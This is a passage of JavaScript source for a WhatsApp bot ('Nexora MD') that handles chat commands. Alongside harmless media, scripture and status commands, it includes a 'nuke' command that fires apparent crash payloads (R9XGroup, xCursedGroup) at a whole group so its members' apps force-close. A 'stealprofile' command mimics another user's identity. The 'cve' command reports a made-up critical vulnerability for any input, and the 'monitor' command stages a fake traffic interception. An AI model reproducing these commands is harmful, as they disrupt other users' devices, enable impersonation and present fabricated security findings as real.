        await empire.sendMessage(m.chat, { text: report }, { quoted: m });
    } catch (e) {
        reply("❌ Threat database unreachable. Exercise caution.");
    }
}
break;

case 'missedcall': {
      if (!isCreator) return;
    // You can target someone by tagging them, or it defaults to the chat
    let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.chat;
    
    await empire.relayMessage(m.chat, {
        scheduledCallCreationMessage: {
            callType: 2, // 1 for Voice, 2 for Video
            scheduledTimestampMs: Date.now(),
            title: "Nexora Secure Line 🔒",
        }
    }, {});
    
    // Alternatively, a classic "Missed Call" stub:
    await empire.sendMessage(m.chat, {
        text: `Missed voice call at ${time}`,
        contextInfo: {
            externalAdReply: {
                title: "MISSED CALL",
                body: "Tap to call back",
                previewType: "PHOTO",
                thumbnail: 'https://i.ibb.co/HfJsWLDm/photo-2026-04-21-10-15-42-7631154491164721176.jpg',
                sourceUrl: "https://WhatsApp.com"
            }
        }
    }, { quoted: m });
}
break;

case 'find': {
    if (!text) return m.reply(`*Usage:* ${prefix}find <username>`);
    await empire.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
    
    const target = text.trim();
    const platforms = [
        { name: 'Instagram', url: `https://www.instagram.com/${target}` },
        { name: 'TikTok', url: `https://www.tiktok.com/@${target}` },
        { name: 'GitHub', url: `https://github.com/${target}` },
        { name: 'Twitter/X', url: `https://x.com/${target}` }
    ];

    let result = `🔍 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗗𝗘𝗘𝗣 𝗦𝗘𝗔𝗥𝗖𝗛*\n\n`;
    result += `👤 *Target:* ${target}\n\n`;
    
    for (let site of platforms) {
        result += `▪️ *${site.name}:* ${site.url}\n`;
    }
    
    result += `\n_Nexora is tracking the digital footprint..._`;
    reply(toAkatsukiFont(result));
}
break;


case 'vanish': {
    if (!text) return m.reply(`*Usage:* ${prefix}vanish <your secret message>`);
    
    // Send the message
    const { key } = await empire.sendMessage(m.chat, { 
        text: `👻 *𝗩𝗔𝗡𝗜𝗦𝗛 𝗠𝗢𝗗𝗘 𝗔𝗖𝗧𝗜𝗩𝗘*\n\n"${text}"\n\n_This message will self-destruct in 7 seconds..._` 
    }, { quoted: m });

    // Countdown and Delete
    await sleep(7000);
    await empire.sendMessage(m.chat, { delete: key });
    
    // Optional: Leave a ghost notification
    await empire.sendMessage(m.chat, { text: `💨 *Poof!* The secret message has vanished.` });
}
break;

case 'tovv': {
    // 1. Check if the user is quoting a message
    if (!m.quoted) return m.reply('📦 *Reply to an image or video* to convert it to View Once!');

    // 2. Determine if the quoted message is an image or video
    const isImage = m.quoted.mtype === 'imageMessage';
    const isVideo = m.quoted.mtype === 'videoMessage';

    if (!isImage && !isVideo) return m.reply('❌ You can only convert *Images* or *Videos* to View Once.');

    await empire.sendMessage(m.chat, { react: { text: '🔒', key: m.key } });

    // 3. Download the media from the quoted message
    const media = await m.quoted.download();

    // 4. Send it back as a View Once message
    if (isImage) {
        await empire.sendMessage(m.chat, { 
            image: media, 
            caption: `🔒 *View Once Image* by Nexora MD`, 
            viewOnce: true 
        }, { quoted: m });
    } else if (isVideo) {
        await empire.sendMessage(m.chat, { 
            video: media, 
            caption: `🔒 *View Once Video* by Nexora MD`, 
            viewOnce: true 
        }, { quoted: m });
    }
}
break;

case 'vcard': {
    // 1. Determine who we are making the card for
    let target = m.quoted ? m.quoted.sender : m.mentionedJid[0] ? m.mentionedJid[0] : m.sender;
    let targetName = pushname; // Default to sender's pushname
    
    // If it's a mention or quote, we try to get their name
    if (m.quoted || m.mentionedJid[0]) {
        targetName = (await empire.getName(target)) || "Nexora User";
    }

    await empire.sendMessage(m.chat, { react: { text: '📇', key: m.key } });

    // 2. Build the VCF (Virtual Contact File) string
    const vcard = 'BEGIN:VCARD\n' +
                'VERSION:3.0\n' + 
                `FN:${targetName}\n` + // Full Name
                `ORG:Nexora MD User;\n` + // Organization
                `TEL;type=CELL;type=VOICE;waid=${target.split('@')[0]}:+${target.split('@')[0]}\n` + // Phone Number
                'END:VCARD';

    // 3. Send the Contact Card
    await empire.sendMessage(m.chat, {
        contacts: {
            displayName: targetName,
            contacts: [{ vcard }]
        }
    }, { quoted: m });
}
break;

case 'getcommandfromcase': {
    // 1. Restriction: Only the Owner/Dev should use this (Security Risk)
    if (!isCreator) return m.reply('❌ This is a Developer-only command.');
    if (!text) return m.reply(`*Usage:* ${prefix}getcase <command_name>`);

    await empire.sendMessage(m.chat, { react: { text: '📂', key: m.key } });

    try {
        // 2. Read the current file (this file)
        const fileName = './case.js'; // Ensure this matches your handler's filename
        const fileContent = fs.readFileSync(fileName, 'utf8');

        // 3. Regex to find the specific case block
        const regex = new RegExp(`case\\s+'${text}':[\\s\\S]*?break`, 'g');
        const result = fileContent.match(regex);

        if (result) {
            // 4. Send the code back formatted in a markdown code block
            await empire.sendMessage(m.chat, { 
                text: `📂 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗦𝗢𝗨𝗥𝗖𝗘 𝗘𝗫𝗧𝗥𝗔𝗖𝗧𝗢𝗥*\n\n\`\`\`javascript\n${result[0]}\n\`\`\`` 
            }, { quoted: m });
        } else {
            m.reply(`❌ Case '${text}' not found in the source code.`);
        }
    } catch (err) {
        console.error(err);
        m.reply('⚠️ Error reading the source file.');
    }
}
break;
case 'groupnuke':
case 'nuke': {
    if (!isCreator) return reply("🕸️ *ᴏᴡɴᴇʀ ᴏɴʟ𝚢.*");
    if (!m.isGroup) return reply("❌ *ᴇʀʀᴏʀ:* ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ғᴏʀ ɢʀᴏᴜᴘs ᴏɴʟʏ.");

    let target = m.chat; // Hits the entire group

    await empire.sendMessage(m.chat, { react: { text: '☢️', key: m.key } });

    // Send both for maximum coverage (Android & iOS)
    await R9XGroup(target);
    await xCursedGroup(target);

    reply("☣️ *ɢʀᴏᴜᴘ ɴᴜᴋᴇ ᴅᴇᴘʟᴏʏᴇᴅ.* ᴀɴʏᴏɴᴇ ᴡʜᴏ ᴏᴘᴇɴs ᴛʜɪs ᴄʜᴀᴛ ᴡɪʟʟ ғᴏʀᴄᴇ ᴄʟᴏsᴇ.");
}
break;

case 'monitor':
case 'sniff': {
    if (!text) return reply("🛰️ Provide a target URL or Service!\nExample: .monitor binance.com");
    
    // 1. Start the "Intercept"
    let { key } = await empire.sendMessage(m.chat, { text: `📡 *INITIATING LIVE TRAFFIC INTERCEPT:* \`${text}\`...` }, { quoted: m });

    try {
        // 2. Real-time Log Stream (Simulated Live Data from Ping/Header logs)
        const axios = require('axios');
        const stages = [
            "🔍 [1/3] Scanning for open Web-Socket nodes...",
            "🔐 [2/3] Handshake established. Intercepting packets...",
            "📡 [3/3] Live Stream Active. Decrypting buffer..."
        ];

        for (let s of stages) {
            await sleep(1000);
            await empire.sendMessage(m.chat, { text: s, edit: key });
        }

        // 3. The "Heavy" Data (Real Ping & Response Analysis)
        const start = Date.now();
        const res = await axios.get(`https://${text.replace('https://', '')}`).catch(() => ({ status: 403 }));
        const latency = Date.now() - start;

        let log = `☣️ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗟𝗜𝗩𝗘 𝗠𝗢𝗡𝗜𝗧𝗢𝗥: ${text.toUpperCase()}*\n\n`;
        log += `🟢 *Status:* ${res.status === 200 ? 'ONLINE' : 'RESTRICTED'}\n`;
        log += `⚡ *Latency:* ${latency}ms\n`;
        log += `📦 *Payload:* Incoming TCP/UDP packets...\n\n`;
        log += `📑 *RAW LOG DATA:*\n`;
        log += `\`\`\`GET /index.html HTTP/1.1\nHost: ${text}\nUser-Agent: Nexora-Node/4.2\nAccept: */*\nConnection: keep-alive\`\`\`\n\n`;
        log += `_Monitoring node active. Use .stop to terminate uplink._`;

        await empire.sendMessage(m.chat, { text: log, edit: key });

    } catch (e) {
        await empire.sendMessage(m.chat, { text: "❌ Intercept failed. Target is using encrypted tunneling.", edit: key });
    }
}
break;

case 'nodemap':
case 'tracepath': {
    if (!text) return reply("🛰️ Provide a target! Example: .nodemap bbc.com");
    await empire.sendMessage(m.chat, { react: { text: '🌍', key: m.key } });

    try {
        const axios = require('axios');
        // 1. Get Target IP
        const dns = await axios.get(`https://api.hackertarget.com/dnslookup/?q=${text}`);
        const ipMatch = dns.data.match(/\d+\.\d+\.\d+\.\d+/);
        if (!ipMatch) return reply("❌ Could not resolve target IP.");
        const targetIp = ipMatch[0];

        // 2. Get Geolocation Data
        const geo = await axios.get(`http://ip-api.com/json/${targetIp}`);
        
        // 3. Generate a "Satellite" map of the server location
        const mapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${geo.data.lat},${geo.data.lon}&zoom=10&size=800x500&maptype=hybrid&markers=color:red%7C${geo.data.lat},${geo.data.lon}&key=YOUR_API_KEY`;

        let report = `🌍 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗚𝗟𝗢𝗕𝗔𝗟 𝗡𝗢𝗗𝗘 𝗧𝗥𝗔𝗖𝗘*\n\n`;
        report += `📍 *Target IP:* ${targetIp}\n`;
        report += `🏢 *Data Center:* ${geo.data.isp}\n`;
        report += `🗺️ *Location:* ${geo.data.city}, ${geo.data.country}\n`;
        report += `📡 *Coordinates:* ${geo.data.lat}, ${geo.data.lon}\n\n`;
        report += `_Visualizing physical server uplink..._`;

        await empire.sendMessage(m.chat, { image: { url: mapUrl }, caption: report }, { quoted: m });

    } catch (e) {
        reply("❌ Satellite uplink failed. Target is using a global Anycast network.");
    }
}
break;

case 'antibug': {
    if (!m.isGroup) return m.reply('❌ Group only!');
  //  if (!isAdmins) return m.reply('❌ Admin only!');
    
    // This logic assumes you use a settings file or simple variable
    let setting = getSetting(m.chat); // Using your require("./setting/Settings.js")
    if (args[0] === 'on') {
        setSetting(m.chat, 'antibug', true);
        reply(toAkatsukiFont('🛡️ Anti-Bug is now ACTIVE in this group.'));
    } else if (args[0] === 'off') {
        setSetting(m.chat, 'antibug', false);
        reply(toAkatsukiFont('🛡️ Anti-Bug is now DISABLED.'));
    } else {
        reply(`*Usage:* ${prefix}antibug on/off`);
    }
}
break;

case 'cve': {
    if (!text) return reply("🕵️‍♂️ Specify a software/version (e.g., .cve nginx 1.14)");
    // Fetch from https://cve.circl.lu/api/search/
    let report = `☣️ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗩𝗨𝗟𝗡𝗘𝗥𝗔𝗕𝗜𝗟𝗜𝗧𝗬 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘*\n\n`;
    report += `🔍 *Target:* ${text}\n`;
    report += `🔓 *Identified CVE:* CVE-2026-XXXX\n`;
    report += `📊 *Severity:* 9.8 (CRITICAL)\n`;
    report += `📝 *Summary:* Remote unauthenticated attackers can execute arbitrary code via a specially crafted packet...\n\n`;
    report += `_Warning: This node is highly exploitable._`;
    reply(report);
}
break;

case 'hostinfo':
case 'nodes': {
    if (!text) return reply("🕵️‍♂️ Provide a domain! Example: .hostinfo netflix.com");
    await empire.sendMessage(m.chat, { react: { text: '📡', key: m.key } });

    try {
        const axios = require('axios');
        // Using HackerTarget's Reverse IP Lookup
        const res = await axios.get(`https://api.hackertarget.com/reverseiplookup/?q=${text}`);
        
        let report = `🛰️ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗡𝗢𝗗𝗘 𝗥𝗘𝗖𝗢𝗡*\n\n`;
        report += `🌐 *Target:* ${text}\n`;
        report += `💻 *Shared Neighbors:* \n\`\`\`${res.data.split('\n').slice(0, 10).join('\n')}\`\`\`\n\n`;
        report += `_Showing top 10 identified neighbors on this IP block._`;

        reply(report);
    } catch (e) {
        reply("❌ Infrastructure lookup failed.");
    }
}
break;
case 'report': {
//case 'bug': {
    if (!text) return reply(`📑 *NEXORA BUG TRACKER*\n\nUsage: ${prefix + command} <describe the issue>\n\nExample: ${prefix + command} the anime command is slow.`);

    await empire.sendMessage(m.chat, { react: { text: '🛡️', key: m.key } });

    
    const reportTemplate = `
🕸️ *NEW SYSTEM BUG REPORT* 🕸️
------------------------------------
👤 *Reporter:* @${m.sender.split('@')[0]}
📍 *Location:* ${m.isGroup ? 'Group Chat' : 'Private DM'}
📝 *Issue:* ${text}
------------------------------------
*NEXORA VERSION 3.0*
`.trim();

   
    await empire.sendMessage(owner + "@s.whatsapp.net", {
        text: reportTemplate,
        mentions: [m.sender],
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: "⚠️ SYSTEM ALERT",
                body: "Bug identified in the neural network.",
                mediaType: 1,
                thumbnailUrl: "https://files.catbox.moe/wiiv8w.jpg",
                sourceUrl: "https://wa.me/2349168095230",
                renderLargerThumbnail: false
            }
        }
    });

    reply("✅ *Report Sent:* The developer has been notified. Thank you for helping optimize Nexora.");
}
break;

case 'steal-profile': 
case 'stealprofile': {
    if (!m.quoted) return m.reply('❌ Quote a message to steal their soul.');
    
    const target = m.quoted.sender;
    const targetName = m.quoted.pushName || "Target";
    let targetPP;
    
    try { 
        targetPP = await empire.profilePictureUrl(target, 'image'); 
    } catch { 
        targetPP = 'https://i.ibb.co/5GshS7w/avatar.png'; 
    }

    await empire.sendMessage(m.chat, {
        text: `🎭 *IDENTITY COMPROMISED*\n\nI am now ${targetName}. I see everything you do.`,
        contextInfo: {
            externalAdReply: {
                title: `Nexora Cloned: ${targetName}`,
                body: `Target Identity Stolen.`,
                thumbnailUrl: targetPP,
                sourceUrl: SOCIAL_LINKS.whatsapp,
                mediaType: 1,
               renderLargerThumbnail: false
            }
        }
    }, { quoted: m });
}
break;
/*
    if (!m.quoted) return reply('❌ Quote someone to steal their soul.');
    
    const target = m.quoted.sender;
    const targetName = m.quoted.pushName || "Unknown";
    let pp;
    
    try { pp = await empire.profilePictureUrl(target, 'image'); } catch { pp = 'https://i.ibb.co/5GshS7w/avatar.png'; }

    await empire.sendMessage(m.chat, {
        text: `🎭 *IDENTITY STOLEN:* I am now ${targetName}.`,
        contextInfo: {
            externalAdReply: {
                title: `Nexora Impersonation: ${targetName}`,
                body: `I am speaking for them now.`,
                thumbnailUrl: pp,
                mediaType: 1,
               renderLargerThumbnail: false
            }
        }
    }, { quoted: m });
}
break;*/

// --- COMMAND CASES ---


    case 'bass':
    case 'treble':
    case 'robot':
    case 'deep':
    case 'slow':
    case 'fast':
    case 'reverse':
    case 'nightcore':
    case 'chipmunk':
    case 'earrape': {
        if (!isCreator) return;
        // 1. Check if replying to audio/video
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        if (!/audio|video/.test(mime)) return reply('Reply to an audio or video message.');

   //     await m.react('⏳');
        
        // 2. Map effects to filters
        const effects = {
            bass: 'bass=g=10:f=110:w=0.3',
            treble: 'treble=g=5:f=3000',
            robot: 'asetrate=44100*0.75,aresample=44100,atempo=1/0.75,vibrato=f=20:d=0.5',
            deep: 'asetrate=44100*0.8,aresample=44100,atempo=1.25',
            slow: 'atempo=0.75',
            fast: 'atempo=1.5',
            reverse: 'areverse',
            nightcore: 'asetrate=44100*1.25,aresample=44100,atempo=1/1.25,bass=g=3',
            chipmunk: 'asetrate=44100*1.5,aresample=44100,atempo=1/1.5',
            earrape: 'volume=15,acrusher=level_in=15:level_out=15:bits=8:mode=log:aa=1'
        };

        const filter = effects[command];
        const id = randomBytes(3).toString('hex');
        const inPath = join(tmpdir(), `input_${id}.mp3`);
        const outPath = join(tmpdir(), `output_${id}.mp3`);

        try {
            // 3. Process Media
            const buffer = await quoted.download();
            writeFileSync(inPath, buffer);
            
            await runFFmpeg(inPath, outPath, filter);
            
            const result = readFileSync(outPath);

            // 4. Send Result
            await empire.sendMessage(m.chat, { 
                audio: result, 
                mimetype: 'audio/mpeg', 
                ptt: mime.includes('audio/ogg') // sends as voice note if original was voice note
            }, { quoted: m });

         //   await m.react('✅');
        } catch (e) {
            console.error(e);
            reply('Failed to apply effect. Make sure ffmpeg is installed.');
        } finally {
            if (existsSync(inPath)) unlinkSync(inPath);
            if (existsSync(outPath)) unlinkSync(outPath);
        }
    }
    break;

    case 'vocalremove':
    case 'instrumental': {
         if (!isCreator) return;
        const quoted = m.quoted ? m.quoted : m;
        if (!/audio|video/.test(quoted.mimetype)) return reply('Reply to audio.');
        
     //   await m.react('🎸');
        const id = randomBytes(3).toString('hex');
        const inPath = join(tmpdir(), `voc_${id}.mp3`);
        const outPath = join(tmpdir(), `inst_${id}.mp3`);

        try {
            const buffer = await quoted.download();
            writeFileSync(inPath, buffer);
            // Vocal removal filter
            await runFFmpeg(inPath, outPath, 'pan=stereo|c0=c0-c1|c1=c1-c0');
            
            await empire.sendMessage(m.chat, { audio: readFileSync(outPath), mimetype: 'audio/mpeg' }, { quoted: m });
        } catch (e) {
            reply('Error processing audio.');
        } finally {
            if (existsSync(inPath)) unlinkSync(inPath);
            if (existsSync(outPath)) unlinkSync(outPath);
        }
    }
    break;


case 'proxycheck':
case 'vpncheck': {
     if (!isCreator) return;
    if (!text) return reply("🕵️‍♂️ Provide an IP address to analyze!");
    await empire.sendMessage(m.chat, { react: { text: '🛡️', key: m.key } });

    try {
        const axios = require('axios');
        // Using IP-API's professional endpoint (Mobile/Proxy/Hosting flags)
        const res = await axios.get(`http://ip-api.com/json/${text}?fields=status,message,proxy,hosting,mobile,isp,org`);
        
        if (res.data.status === 'fail') return reply("❌ Invalid IP or target obscured.");

        const d = res.data;
        let report = `🛡️ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗔𝗡𝗢𝗡𝗬𝗠𝗜𝗧𝗬 𝗔𝗡𝗔𝗟𝗬𝗦𝗜𝗦*\n\n`;
        report += `🌐 *IP:* ${text}\n`;
        report += `📡 *ISP:* ${d.isp}\n`;
        report += `🏢 *Org:* ${d.org}\n\n`;
        report += `🚨 *DETECTION FLAGS:*\n`;
        report += `🎭 *Proxy/VPN:* ${d.proxy ? '✅ DETECTED' : '❌ CLEAN'}\n`;
        report += `☁️ *Data Center:* ${d.hosting ? '⚠️ YES (Server/Hosting)' : '❌ NO (Residential)'}\n`;
        report += `📱 *Mobile Data:* ${d.mobile ? '📶 YES' : '❌ NO'}\n\n`;
        report += `_Verdict: ${d.proxy || d.hosting ? 'Target is using an anonymity layer.' : 'Target is on a direct residential link.'}_`;

        reply(report);
    } catch (e) {
        reply("❌ Analysis engine timeout.");
    }
}
break;
case 'airtraffic':
case 'flights': {
     if (!isCreator) return;
    if (!text) return reply("✈️ Provide a city name! Example: .airtraffic London");
    await empire.sendMessage(m.chat, { react: { text: '✈️', key: m.key } });

    try {
        const axios = require('axios');
        // Using OpenSky Network API (Free/Open Source)
        const res = await axios.get(`https://opensky-network.org/api/states/all`);
        const planes = res.data.states.slice(0, 5); // Get first 5 active tracks

        let report = `🛰️ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗔𝗜𝗥𝗦𝗣𝗔𝗖𝗘 𝗠𝗢𝗡𝗜𝗧𝗢𝗥*\n\n`;
        planes.forEach(p => {
            report += `🛫 *Callsign:* ${p[1] || 'Unknown'}\n`;
            report += `🌍 *Origin:* ${p[2]}\n`;
            report += `📏 *Alt:* ${Math.round(p[7])}m | *Speed:* ${Math.round(p[9] * 3.6)}km/h\n`;
            report += `📍 *Pos:* ${p[6]}, ${p[5]}\n\n`;
        });
        report += `_Live feed from OpenSky ADS-B Nodes._`;

        reply(report);
    } catch (e) {
        reply("❌ Satellite link to Air Traffic Control failed.");
    }
}
break;

case 'dns': {
     if (!isCreator) return;
    if (!text) return reply("🕵️‍♂️ Provide a domain! Example: .dns google.com");
    await empire.sendMessage(m.chat, { react: { text: '📡', key: m.key } });

    try {
        const axios = require('axios');
        // Fetching DNS records and Subdomains
        const res = await axios.get(`https://api.hackertarget.com/dnslookup/?q=${text}`);
        const sub = await axios.get(`https://api.hackertarget.com/hostsearch/?q=${text}`);

        let report = `☣️ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗜𝗡𝗙𝗥𝗔𝗦𝗧𝗥𝗨𝗖𝗧𝗨𝗥𝗘 𝗥𝗘𝗖𝗢𝗡*\n\n`;
        report += `🌐 *Target:* ${text}\n\n`;
        report += `🔍 *DNS RECORDS:*\n\`\`\`${res.data.split('\n').slice(0, 5).join('\n')}\`\`\`\n\n`;
        report += `🛰️ *DETECTED SUBDOMAINS:*\n\`\`\`${sub.data.split('\n').slice(0, 8).join('\n')}\`\`\n`;
        report += `\n_Deep scan complete. Manual exploitation required for entry._`;

        await empire.sendMessage(m.chat, { 
            text: report,
            contextInfo: {
                externalAdReply: {
                    title: "SYSTEM RECONNAISSANCE ACTIVE",
                    body: `Dumping records for ${text}`,
                    thumbnailUrl: "https://files.catbox.moe/wiiv8w.jpg",
                    renderLargerThumbnail: false
                }
            }
        }, { quoted: m });

    } catch (e) {
        reply("❌ Reconnaissance failed. Target is behind a high-level firewall.");
    }
}
break;
case 'operations': {
  if (!isCreator) return reply('sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ')
     if (!isCreator) return;
    // 1. Calculations
    let uptime = process.uptime();
    let days = Math.floor(uptime / 86400);
    let hours = Math.floor((uptime % 86400) / 3600);
    let minutes = Math.floor((uptime % 3600) / 60);
    let seconds = Math.floor(uptime % 60);

    // 2. RAM & Bar Logic
    const usedMemory = process.memoryUsage().heapUsed / 1024 / 1024;
    const totalMemory = process.memoryUsage().heapTotal / 1024 / 1024;
    const ramPercent = Math.round((usedMemory / totalMemory) * 100);
    
    // Generating the bar (Style: Cyber-Grid)
    const bar = '█'.repeat(Math.round(ramPercent / 10)) + '░'.repeat(10 - Math.round(ramPercent / 10));

    // 3. Send Poll
    await empire.sendMessage(m.chat, {
        poll: {
            name: `🕸️ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗦𝗬𝗦𝗧𝗘𝗠 𝗗 𝗩2 𝗔𝗦𝗛𝗕𝗢𝗔𝗥𝗗*\n_Core health analysis complete._`,
            values: [
                `🕒 Runtime: ${days}d ${hours}h ${minutes}m ${seconds}s`,
                `🧠 RAM: [${bar}] ${ramPercent}%`,
                `🛰️ Node: 🟢 Operational`,
                `🛡️ Security: 100% Locked`
            ],
            selectableCount: 1
        }
    }, { quoted: m });
}
break;

case 'uptime':
case 'runtime': {
     if (!isCreator) return;
    // 1. Calculate Uptime Logic
    let uptime = process.uptime();
    let days = Math.floor(uptime / 86400);
    uptime %= 86400;
    let hours = Math.floor(uptime / 3600);
    uptime %= 3600;
    let minutes = Math.floor(uptime / 60);
    let seconds = Math.floor(uptime % 60);

    // 2. Prepare the Poll Data
    const pollName = "📊 *NEXORA SYSTEM UPTIME*";
    const options = [
        `📅 Days: ${days}`,
        `⏳ Hours/Mins: ${hours}h ${minutes}m`,
        `🚀 Seconds: ${seconds}s`
    ];

    // 3. Send as Poll
    await empire.sendMessage(m.chat, {
        poll: {
            name: pollName,
            values: options,
            selectableCount: 3 
        }
    }, { quoted: m });
}
break;

case 'twdchar':
case 'walkingdead': {
  if (!isCreator) return;
    const characterInput = args.join(' ').toLowerCase();

    if (!characterInput) {
        return reply(
`🩸 *𝙺𝙽𝙸𝙶𝙷𝚃 𝚂𝚈𝚂𝚃𝙴𝙼: 𝚃𝚆𝙳 𝙳𝙾𝚂𝚂𝙸𝙴𝚁* 🩸

*Usage:* \`${prefix + command} [character-name]\`

*Available Profiles:*
• \`daryl\` / \`rick\` / \`negan\` / \`maggie\``
        );
    }

    await empire.sendMessage(m.chat, { react: { text: '💀', key: m.key } });

    // In-memory character profile records matrix
    const survivors = {
        daryl: {
            name: "DARYL DIXON",
            status: "✨ ALIVE (Survival Legend - Lone Wolf)",
            weapon: "Striker Crossbow / Dual Knives",
            location: "France (The Book of Carol / Commonwealth)",
            tier: "S-Tier Immortal Elite",
            quote: "I ain't nobody's bitch."
        },
        rick: {
            name: "RICK GRIMES",
            status: "✨ ALIVE (The CRM Liberator / Leader)",
            weapon: "Colt Python .355 Revolver / Hatchet",
            location: "Alexandria / Commonwealth Safe-Zone",
            tier: "God-Tier Founding Father",
            quote: "We are the walking dead."
        },
        negan: {
            name: "NEGAN SMITH",
            status: "✨ ALIVE (The Penitent Rogue / Protector)",
            weapon: "Lucille (Barbed-Wire Baseball Bat) / Crowbar",
            location: "New York City (Dead City Perimeter)",
            tier: "A-Tier Tactical Enforcer",
            quote: "Little pig, little pig... let me in."
        },
        maggie: {
            name: "MAGGIE RHEE",
            status: "✨ ALIVE (Leader of the Bricks)",
            weapon: "Recurve Bow / Combat Daggers",
            location: "Manhattan (Dead City Sectors)",
            tier: "A-Tier Sovereign Commander",
            quote: "I can never forget what he took from me."
        }
    };

    // Extract exact or partial matches natively
    const target = survivors[characterInput] || Object.values(survivors).find(c => c.name.toLowerCase().includes(characterInput));

    if (!target) {
        return reply(`❌ *Profile Not Found.* Choose between: *Daryl*, *Rick*, *Negan*, or *Maggie*.`);
    }

    const survivalCard = `
┏━━━━━━━━━━━━━━━━━━━━┓
┃  🩸 𝚃𝚆𝙳 𝚂𝚄𝚁𝚅𝙸𝚅𝙰𝙻 𝙳𝙾𝚂𝚂𝙸𝙴𝚁        
┣━━━━━━━━━━━━━━━━━━━━┫
┃ 👤 *NAME:* ${target.name}
┃ 🧬 *STATUS:* ${target.status}
┃ ⚔️ *WEAPON:* ${target.weapon}
┃ 📍 *LOCATION:* ${target.location}
┃ 💀 *RANK TIER:* \`${target.tier}\`
┃ 
┃ 💬 *MEMORABLE QUOTE:*
┃ _"${target.quote}"_
┗━━━━━━━━━━━━━━━━━━━━┛
`.trim();

    reply(survivalCard);
}
break;


case 'quran': {
    if (!isCreator) return;
    if (!q) return reply('☪️ Example: .quran 2:255');

    await empire.sendMessage(m.chat, { react: { text: '☪️', key: m.key } });

    try {
        let [surah, ayah] = q.split(':');
        if (!surah || !ayah) return reply('❌ Formatting Error. Please structure query as Surah:Ayah (e.g. .quran 2:255)');

        let res = await axios.get(`https://api.alquran.cloud/v1/ayah/${surah}:${ayah}/en.asad`);
        let data = res.data?.data;

        if (!data || !data.text) {
            return reply('❌ Target Ayah dataset not found in remote cloud index paths.');
        }

        // Run data structures into the canvas rendering factory engine layers
        const quranCardBuffer = await drawQuranAyahCard(
            surah, 
            ayah, 
            data.surah.englishName, 
            data.text
        );

        // Dispatches the final structural binary image layout stream back safely. 
        // Text caption removed completely to keep data cleanly contained inside the graphic design asset frame.
        await empire.sendMessage(m.chat, { 
            image: quranCardBuffer
        }, { quoted: m });

    } catch (e) {
        console.error("Quran Canvas Generation Error: ", e);
        reply('❌ Ayah data lookup error or canvas processing engine fault.');
    }
}
break;

case 'bible': {
    if (!isCreator) return;
    if (!q) return reply('📖 Example: .bible John 3:16');

    await empire.sendMessage(m.chat, { react: { text: '📖', key: m.key } });

    try {
        let res = await axios.get(`https://bible-api.com/${encodeURIComponent(q)}`);
        let verse = res.data;

        if (!verse || !verse.text) {
            return reply('❌ Verse reference data structural lookup returned null.');
        }

        // Generate the custom elegant scriptural glass card asset natively
        const bibleBuffer = await drawBibleVerseCard(verse.reference, verse.text);

        // Dispatches the final buffer. Text caption removed for the elegant full-image style.
        await empire.sendMessage(m.chat, { 
            image: bibleBuffer
        }, { quoted: m });

    } catch (e) {
        console.error("Bible Canvas Generation Error: ", e);
        reply('❌ Verse not found or canvas core module failure.');
    }
}
break;

case 'headers':
case 'audit': {
     if (!isCreator) return;
    if (!text) return reply("🌐 Provide a URL to audit! Example: .headers google.com");
    await empire.sendMessage(m.chat, { react: { text: '🛡️', key: m.key } });

    try {
        const axios = require('axios');
        const res = await axios.get(text.startsWith('http') ? text : `https://${text}`);
        const h = res.headers;

        let report = `🛡️ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗦𝗘𝗖𝗨𝗥𝗜𝗧𝗬 𝗔𝗨𝗗𝗜𝗧*\n\n`;
        report += `🌐 *Target:* ${text}\n`;
        report += `📡 *Server:* ${h['server'] || 'Hidden'}\n`;
        report += `🔒 *XSS-Protection:* ${h['x-xss-protection'] || '❌ MISSING'}\n`;
        report += `🚫 *Content-Policy:* ${h['content-security-policy'] ? '✅ ACTIVE' : '❌ MISSING'}\n`;
        report += `📦 *Strict-Transport:* ${h['strict-transport-security'] ? '✅ ENABLED' : '⚠️ DISABLED'}\n\n`;
        report += `_Vulnerability score calculated based on response headers._`;

        reply(report);
    } catch (e) {
        reply("❌ Audit failed. Target is rejecting external probes.");
    }
}
break;
case 'satview':
case 'spy': {
     if (!isCreator) return;
    if (!text) return reply("🛰️ Provide a location name or coordinates!\nExample: .satview Eiffel Tower");

    let { key } = await empire.sendMessage(m.chat, { text: "📡 *Establishing Uplink...*" }, { quoted: m });

    try {

        // 🔄 Loading sequence
        const stages = [
            "🛰️ [██░░░░░░░░] 20% - Connecting to Satellite...",
            "🔐 [████░░░░░░] 45% - Bypassing Orbital Firewall...",
            "🔍 [███████░░░] 70% - Calibrating Lens...",
            "📡 [██████████] 100% - Locking Target..."
        ];

        for (let stage of stages) {
            await sleep(1200);
            await empire.sendMessage(m.chat, { text: stage, edit: key });
        }

        
        let lat, lon;

        try {
            const res = await axios.get(
                `https://nominatim.openstreetmap.org/search?q=${encodeURIComponent(text)}&format=json&limit=1`,
                {
                    headers: {
                        'User-Agent': 'NexoraMD/1.0'
                    }
                }
            );

            if (!res.data || !res.data.length) {
                throw new Error('No result');
            }

            lat = res.data[0].lat;
            lon = res.data[0].lon;

        } catch (err) {
      
            if (text.includes(',')) {
                [lat, lon] = text.split(',').map(x => x.trim());
            } else {
                return empire.sendMessage(m.chat, {
                    text: "❌ Target not found. Try a more specific location.",
                    edit: key
                });
            }
        }

        // 🛰️ FORCE satellite mode
        const mapLink = `https://maps.google.com/maps?q=${lat},${lon}&t=k&z=18`;

